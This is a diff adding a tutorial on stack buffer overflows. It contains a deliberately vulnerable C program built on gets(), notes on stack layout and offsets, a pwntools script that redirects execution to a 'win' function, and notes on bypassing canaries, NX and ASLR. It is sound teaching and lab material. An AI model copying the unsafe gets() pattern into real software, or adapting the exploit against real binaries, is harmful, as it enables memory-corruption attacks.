@@ -1,1 +1,116 @@
 
+Step 1: The Vulnerable Target Program (C Source)
+
+Consider this classic vulnerable C program. It allocates a small buffer but uses an unsafe function (gets) that reads input without checking bounds.
+c
+#include <stdio.h>
+#include <string.h>
+
+void win() {
+    printf("Success! You hijacked the control flow!\n");
+}
+
+void vulnerable_function() {
+    char buffer[64]; // Allocates 64 bytes on the stack
+    printf("Enter your payload: ");
+    gets(buffer);    // UNSAFE: Reads until a newline, ignoring buffer size
+}
+
+int main() {
+    vulnerable_function();
+    return 0;
+}
+Use code with caution.
+
+Step 2: Visualizing the Stack Layout
+
+When vulnerable_function is called, the CPU sets up a stack frame. Here is how memory looks before and after a stack overflow injection:
+
+Normal Stack Layout
+
+text
+[   64 Bytes of Buffer   ][ Saved RBP / EBP ][ Return Address (RIP) ]
+^                         ^                  ^
+&buffer[0]                End of local data  Where code jumps to next
+Use code with caution.
+
+Overflowed Stack Layout
+
+text
+[ 'A' x 64 (Fills Buffer) ][ 'B' x 8 (Fills RBP) ][  Target Address ('win' function)  ]
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+               Padding (72 bytes)                       Overwrites Return Address
+Use code with caution.
+
+Step 3: Step-by-Step Analysis Process
+
+
+1. Determine the Offset to the Return Address
+
+To overwrite the return address precisely, you must find exactly how many bytes sit between the start of your buffer and the return address.
+• You can generate a unique cyclic pattern using pwntools (via cyclic 100) or GDB's pattern create.
+• Run the program inside a debugger like GDB-GEF, paste the pattern, and look at the crash state. If the program crashes at an invalid address like 0x6161616161616169, you calculate the offset:
+\(\text{Offset}=72\text{\ bytes}\)
+
+2. Find the Target Address (win)
+
+You need the memory address of the function you want to redirect code execution to. Inside GDB, you can run:
+bash
+(gdb) print win
+$1 = {void ()} 0x401196 <win>
+Use code with caution.
+• Target Address: 0x00401196
+
+Step 4: Automating the Exploit with Python (pwntools)
+
+To exploit this program reliably, we use Python with the pwntools library to assemble the raw byte payload and handle input/output interaction.
+
+The Python Exploit Script
+
+python
+from pwn import *
+
+# 1. Configuration and Target Setup
+# Replace './vuln_binary' with the path to your compiled target file
+target_binary = './vuln_binary'
+elf = ELF(target_binary)
+
+# Automatically extract the 'win' function address from the binary symbols
+win_address = elf.symbols['win'] 
+log.info(f"Extracted 'win' function address: {hex(win_address)}")
+
+# 2. Construct the Payload
+offset = 72                             # Distance to the Return Address
+padding = b"A" * offset                 # Fill the buffer and Saved RBP
+return_address = p64(win_address)       # Pack the target address into 64-bit little-endian bytes
+
+payload = padding + return_address
+
+# 3. Fire the Exploit
+# Start the local process
+p = process(target_binary)
+
+# Wait for the prompt and send the payload
+p.recvuntil(b"Enter your payload: ")
+p.sendline(payload)
+
+# Keep the connection open to read the output
+print(p.recvall().decode('utf-8', errors='ignore'))
+Use code with caution.
+
+Step 5: Modern Stack Protections to Watch Out For
+
+In real-world binary exploitation, standard compiler mitigations make simple overflows harder. You can check a binary's defenses using the command checksec <file>:
+• Stack Canaries (Stack Cookies): The compiler places a random secret value right before the saved RBP. If your overflow overwrites this value, the program detects it and immediately terminates before executing the modified return address.
+	• Bypass: Leak the canary value via a format string vulnerability first, or find a way to brute-force it.
+• NX / DEP (No-Execute / Data Execution Prevention): Marks the stack as non-executable. You cannot inject custom shellcode directly onto the stack and jump to it.
+	• Bypass: Use ROP (Return-Oriented Programming) to string together existing snippets of executable code (gadgets) already present inside the binary or libc.
+• ASLR (Address Space Layout Randomization): Randomizes the locations of the stack, heap, and libraries (like libc) in memory every time the program runs.
+	• Bypass: Leak a function pointer's real-time address to calculate the base address offset of the library dynamically.
+
+Restating the Core Solution Mechanics
+
+
+✅ Hijack Mechanism
+
+A stack overflow works by completely overflowing a local array variable until it reaches and corrupts the Return Address pointer on the stack framework, letting the operator point execution to any arbitrary instruction memory space.
